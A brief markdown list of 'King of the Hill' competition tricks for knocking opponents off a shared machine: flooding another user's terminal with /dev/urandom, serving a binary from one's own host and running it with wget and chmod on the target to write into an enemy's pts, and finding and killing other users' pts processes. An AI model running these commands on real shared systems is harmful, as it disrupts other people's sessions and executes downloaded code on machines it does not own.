# koth_tricks
## Killing pts 
1. Breaking pts by spamming urandom on thier terminal<br>
    | cat /dev/urandom > /dev/pts/$PTS<br>
 
2. NyanCat<br>

    | sudo python3 -m http.server 80 # On your local machine<br>
    | wget http://yourip/nyancat # On the KOTH machine<br>
    | chmod +x nyancat <br>
    | ./nyancat > /dev/$pts  #replace $pts with pts of enemy<br>
    

3. Kill pts <br>
    | ps aux | grep pts <br>
    
    Then, look for a pts that is not yours and kill its process.<br>
    
    | kill -9 $PID #pid should be of a processs of enemy's pts<br>

